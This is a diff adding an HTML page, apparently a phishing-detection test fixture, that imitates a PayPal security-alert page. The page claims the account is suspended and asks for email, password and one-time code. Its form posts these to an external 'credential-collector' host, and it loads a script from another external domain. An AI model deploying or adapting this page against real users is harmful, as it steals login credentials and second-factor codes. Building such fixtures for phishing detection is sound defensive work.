@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal Account Security Center — Urgent Verification Required</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f7fa;
+            margin: 0;
+            padding: 40px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .security-card {
+            background: white;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            max-width: 440px;
+            width: 100%;
+        }
+        .brand-header {
+            color: #003087;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 12px;
+        }
+        .alert-banner {
+            background-color: #fff3cd;
+            color: #856404;
+            padding: 12px;
+            border-radius: 4px;
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+        .form-group {
+            margin-bottom: 16px;
+        }
+        label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 13px;
+            font-weight: bold;
+        }
+        input[type="text"], input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        .btn-submit {
+            background-color: #0070ba;
+            color: white;
+            padding: 12px;
+            border: none;
+            border-radius: 20px;
+            width: 100%;
+            font-size: 15px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="security-card">
+        <div class="brand-header">PayPal Security Center</div>
+        <div class="alert-banner">
+            <strong>Security Alert:</strong> Your account has been suspended due to unauthorized access.
+            Please verify your identity and enter your password to confirm account restoration.
+        </div>
+
+        <!-- Controlled Phishing Test Fixture: External Form Action & Credential Inputs -->
+        <form action="http://malicious-credential-collector.xyz/harvest-tokens" method="POST">
+            <input type="hidden" name="csrf_token" value="fake_phishguard_token_12345" />
+            
+            <div class="form-group">
+                <label for="username">Email or Mobile Number</label>
+                <input type="email" id="username" name="email" placeholder="name@example.com" required />
+            </div>
+
+            <div class="form-group">
+                <label for="password">Account Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required />
+            </div>
+
+            <div class="form-group">
+                <label for="otp">One-Time Password (OTP)</label>
+                <input type="text" id="otp" name="otp" placeholder="6-digit verification code" />
+            </div>
+
+            <button type="submit" class="btn-submit">Confirm and Verify Account</button>
+        </form>
+    </div>
+
+    <!-- External Script Sample for Telemetry -->
+    <script src="http://external-tracker-analytics.xyz/telemetry.js"></script>
+</body>
+</html>
